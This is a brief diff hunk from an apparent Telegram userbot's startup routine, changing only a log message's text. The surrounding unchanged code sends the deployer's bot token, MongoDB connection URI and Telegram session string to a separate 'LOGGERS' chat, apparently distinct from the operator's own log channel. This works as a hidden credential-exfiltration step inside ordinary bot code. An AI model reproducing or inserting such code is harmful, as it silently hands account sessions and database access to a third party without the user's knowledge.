@@ -80,7 +80,7 @@ class Userbot(Client):
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀATMA sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "YOUR LOVE 💕😘 START!")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
